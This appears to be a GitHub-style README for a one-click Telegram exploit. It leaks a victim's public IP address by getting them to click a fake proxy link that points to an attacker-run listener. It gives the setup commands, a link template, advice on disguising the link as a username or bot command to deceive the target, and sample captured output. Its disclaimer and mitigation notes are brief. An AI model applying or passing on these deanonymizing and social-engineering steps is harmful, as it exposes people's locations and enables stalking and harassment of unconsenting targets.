# Telegram IP Address Leak Exploit

## Overview

This is a one-click exploit that allows you to leak a victim's public IP address through Telegram. The exploit takes advantage of Telegram's automatic proxy connection testing mechanism on mobile clients.

**Affected Platforms:** Android and iOS clients only

## How It Works

Telegram automatically attempts to test proxy connections when a user interacts with a proxy link. The secret key parameter is irrelevant - Telegram will still attempt to connect, exposing the user's IP address in the process.

When a user clicks on a disguised proxy link (thinking they're opening a DM with a bot or another user), their Telegram client automatically attempts to connect to the fake proxy server, revealing their real IP address.

## Setup Instructions

### 1. Start the Listener Server

Run the exploit script on your VPS or server:

```bash
python3 exploit.py
```

The server will listen on `0.0.0.0:2398` by default. You can modify the `HOST` and `PORT` variables in the script if needed.

### 2. Get Your Server's Public IP

Make sure you know your server's public IP address. You can check it with:

```bash
curl ifconfig.me
```

### 3. Generate the Malicious Link

Create a Telegram proxy link with the following format:

```
t.me/proxy?server=YOUR_IP&port=YOUR_PORT&secret=random
```

Replace:
- `YOUR_IP` with your server's public IP address
- `YOUR_PORT` with the port your server is listening on (default: 2398)
- `secret=random` can be any value - it doesn't matter

**Example:**
```
t.me/proxy?server=123.45.67.89&port=2398&secret=abc123
```

### 4. Disguise the Link

Bundle the link in text to make it look legitimate. You can:
- Hide it behind a username mention
- Embed it in a message that appears to be a bot command
- Make it look like a regular Telegram link


![Disguised link preview](./imgs/qSnkhe3.png)


### 5. Send and Wait

Send the message to your target. As soon as they click on it (thinking they're opening a DM or interacting with a bot), their Telegram client will automatically attempt to connect to your fake proxy server.

The connection attempt will be logged in your server console, revealing:
- The victim's IP address
- The source port
- The timestamp of the connection

## Example Output

```
[+] Listening on 0.0.0.0:2398
[!] Incoming connection
    IP        : 192.168.1.100
    Port      : 54321
    Timestamp : 2024-01-15 14:30:45.123456 UTC
```

## Technical Details

- **Protocol:** TCP
- **Automatic Connection:** Telegram clients automatically test proxy connections without user confirmation
- **One-Click:** A single click on the link is sufficient to trigger the connection
- **Platform Specific:** Only affects Android and iOS Telegram clients

## Security Implications

This exploit demonstrates that:
1. Telegram automatically tests proxy connections without explicit user consent
2. The secret key parameter does not prevent connection attempts
3. IP addresses can be leaked through a simple social engineering attack

## Mitigation

Users should:
- Be cautious when clicking on links in Telegram messages
- Verify the legitimacy of links before clicking
- Use VPN services if privacy is a concern

## Contact

You can contact me on [Telegram](https://t.me/CurtisARP)

## Disclaimer

This exploit is for educational and security research purposes only. Only use this on systems you own or have explicit permission to test. Unauthorized access to computer systems is illegal.
